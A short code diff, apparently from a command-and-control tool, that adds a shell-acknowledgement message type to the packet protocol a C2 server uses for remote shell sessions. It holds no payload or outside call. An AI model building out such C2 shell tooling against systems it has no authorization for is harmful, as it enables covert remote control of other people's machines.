@@ -12,6 +12,7 @@ MESSAGE_SHELL_DATA = 3
 MESSAGE_SHELL_EXIT = 4
 MESSAGE_OUTPUT = 5
 MESSAGE_ERROR = 6
+MESSAGE_SHELL_ACK = 7 # indicates shell established or not
 
 
 def packet_formation(message_type, session_id, payload): # forms command packet strcuture so that we can receive it in c2 server and understand what part of the command is what
